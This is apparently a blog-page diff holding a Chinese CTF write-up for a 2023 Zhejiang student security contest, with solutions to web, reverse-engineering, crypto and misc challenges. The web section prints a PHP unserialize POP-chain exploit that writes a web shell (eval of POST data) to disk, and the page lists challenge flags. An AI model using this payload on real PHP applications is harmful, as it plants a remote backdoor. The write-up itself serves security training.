@@ -1,0 +1,376 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>2023浙江省大学生信息安全竞赛初赛 部分wp | Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>2023浙江省大学生信息安全竞赛初赛 部分wp</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/5
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h4><p>BBB::__debuginfo() -&gt; CCC::__toString() -&gt; AAA::__call()</p>
+<pre><code class="php">&lt;?php
+class AAA&#123;
+    public $cmd;
+
+    public function __call($name, $arguments)&#123;
+        eval($this-&gt;cmd);
+        return &quot;done&quot;;
+    &#125;
+&#125;
+
+class BBB&#123;
+    public $param1;
+    public function __construct($param1)&#123;
+        $this-&gt;param1 = $param1;
+    &#125;
+    public function __debuginfo()&#123;
+        return [
+            &#39;debugInfo&#39; =&gt; &#39;param1&#39; . $this-&gt;param1 
+        ];
+    &#125;
+&#125;
+
+class CCC&#123;
+    public $func;
+
+    public function __toString()&#123;
+        var_dump(&quot;aaa&quot;);
+        $this-&gt;func-&gt;aaa();
+    &#125;
+&#125;
+
+if(isset($_GET[&#39;aaa&#39;]))&#123;
+    $aaa = $_GET[&#39;aaa&#39;];
+    var_dump(unserialize($aaa));
+&#125;
+
+
+$C = new CCC();
+$B = new BBB($C);
+$A = new AAA();
+$A -&gt;cmd= &quot;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval(\$_POST[1]);?&gt;&#39;);&quot;;
+$C-&gt;func = $A; 
+
+echo serialize($B);
+# O:3:&quot;BBB&quot;:1:&#123;s:6:&quot;param1&quot;;O:3:&quot;CCC&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;AAA&quot;:1:&#123;s:3:&quot;cmd&quot;;s:58:&quot;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);&quot;;&#125;&#125;&#125;
+</code></pre>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="pyccc"><a href="#pyccc" class="headerlink" title="pyccc"></a>pyccc</h4><p>uncompyle6.exe 逆不出py</p>
+<p>逆出如下文件<img src="https://img-blog.csdnimg.cn/img_convert/2132a7f79acde9b99fec3ef17caef4a5.png" alt="image-20231104140256253"></p>
+<p>分析可知 先初始化一个数组 再对其内的每个元素异或其下标</p>
+<pre><code class="py">c=[102,109,99,100,127,52,114,88,97,122,85,125,105,127,119,80,120,112,98,39,109,52,55,106]
+# print(len(c))
+tem = &quot;&quot;
+for i in range(len(c)):
+    tem += chr((c[i]) ^ i)
+print(tem,end=&quot;&quot;)
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/97f99383b91c3086ecf93b42cd5caf67.png" alt="image-20231104140349545"></p>
+<p><code>flag&#123;1t_is_very_hap4y!!&#125;</code></p>
+<h4 id="ezapk"><a href="#ezapk" class="headerlink" title="ezapk"></a>ezapk</h4><p>反编译apk</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cc6e872e77f4a7cd12faf8860333949d.png" alt="image-20231104153119840"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/518415be9fa2072797ae8b09314afa40.png" alt="image-20231104153114211"></p>
+<p>解aes</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d2df136fd6f002dab1cffd00a0e0b2c3.png" alt="image-20231104153136786"></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="小小数学家"><a href="#小小数学家" class="headerlink" title="小小数学家"></a>小小数学家</h4><p>re 匹配数字和符号进行运算</p>
+<pre><code class="py">import re
+num = re.compile(&quot;\d+&quot;)
+symble = re.compile(&quot;\W&quot;)
+
+with open(&quot;./flag.txt&quot;, &quot;r&quot;)as f:
+    lines = f.readlines()
+
+    for line in lines:
+        nums = (num.findall(line))
+        symbles = (symble.findall(line))
+        print(chr(int(eval(nums[0]+ symbles[0] + nums[1]))),end=&quot;&quot;)
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01afb93e696c8076d3af8ff0d178d1b1.png" alt="image-20231104140435619"></p>
+<p><code>DASCTF&#123;9d811301-281b-4f4a-8d1a-b38beccf2285&#125;</code></p>
+<h4 id="基础数论"><a href="#基础数论" class="headerlink" title="基础数论"></a>基础数论</h4><p>sage解p^2^ + q^2^ &#x3D;n</p>
+<pre><code class="py">import hashlib
+
+c = 173178061442550241596295506150572803829268102881297542445649200353047297914764783385643705889370567071577408829104128703765633248277722687055281420899564198724968491216409225857070531370724352556864154450614891750313803499101686782558259953244119778256806332589612663957000269869144555485216828399422391672121
+x,y = (two_squares(c))
+print(x,y)
+print(hashlib.md5(str(x+y).encode()).hexdigest())
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/744bf323695ef992300499edf927e1f8.png" alt="image-20231104151117235"></p>
+<p><code>8ef20a4873c5ec776dd34bf5f0eb56cf</code></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="number-game"><a href="#number-game" class="headerlink" title="number game"></a>number game</h4><p>后端就只有个js文件，可以发现roll这段代码很关键（因为题目说通过roll得到flag）</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/65758afd84e5437a7c04fd88757a067d.png" alt="image-20231104164051987"></p>
+<p>将这段js复制处理，放入console，把if的判断条件改为true，然后再次点击roll，可以发现弹<br>flag了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/06f8e7b64fae01d507122fce7cfbf72e.png" alt="image-20231104164058097"></p>
+<h4 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a>Ez_misc</h4><p>拿到题目，根据jpg的文件头，可以发现每两位16进制是反的，那么我们只需要翻转就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f7152ce4d0be87c5fd2e237eecc7df73.png" alt="image-20231104164116883"></p>
+<p>使用脚本进行反转</p>
+<pre><code class="py">&#39;&#39;&#39;
+A.bin
+21.7.22
+&#39;&#39;&#39;
+input=open(&#39;C:/Users/Abin/Desktop/yuanshen&#39;,&#39;rb&#39;)
+input_all = input.read()
+ss =input_all[::-1]
+output=open(&#39;C:/Users/Abin/Desktop/y.zip&#39;,&#39;wb&#39;)
+output.write(ss)
+input.close()
+output.close()
+</code></pre>
+<p>反转之后的结果并不是正确的（因为是逆序的十六进制），我们还需要将整体的字符串反<br>转，这里我使用工具进行反转</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/133d497c8418af4c60398b9d0b1a0b49.png" alt="image-20231104164158024"></p>
+<p>数据放入010中生成图片</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d8b3dae39057297c55b1ff18fcfde523.png" alt="image-20231104164209165"></p>
+<p>使用steghide进行解密，获得flag.txt</p>
+<pre><code>DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DASHDOTDASHDOT
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DASHDOTDOTDOTDOT DASHDASHDOTDOTDOT
+DASHDASHDOTDOTDOT DASHDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DOTDOTDOTDASHDASH DOTDOTDASHDASHDASH
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH
+DOTDOTDOTDASHDASH DASHDASHDASHDOTDOT DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DOTDOTDOTDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DASHDOTDOTDOTDOT DOTDOTDOTDOTDASH
+DOTDOTDOTDASHDASH DASHDASHDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DOTDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH
+DASHDASHDOTDOTDOT DASHDOTDOT
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2a383636f79c1c872b6d15f9ad33531a.png" alt="image-20231104164227594"></p>
+<p>根据摩斯密码的特征，及那个DASH转为-，DOT转为.，获得下面的代码</p>
+<p>-…. -…. -…. -.-. -…. .—- -…. –… –… -… -…. ….- -…. -…. …– ….- -…. -…. …– -…. …– …– …–<br>….. -…. .—- -…. ..— …– …– …– ….- …– ..— -…. .—- …– ….. -…. ..— …– …– -…. ..— -….<br>..— …– —.. …– ….. …– ….. -…. .—- …– ….- …– -…. …– ….- -…. ….- …– –… -…. ..— -….<br>..— …– ….- -…. ….. -…. …– –… -..</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6685a14eb5b45c6613efcb0e08e10d05.png" alt="image-20231104164246025"></p>
+<p>解得flag<br><code>flag&#123;df4f635ab342a5b3bb855a464d7bb4ec&#125;</code></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
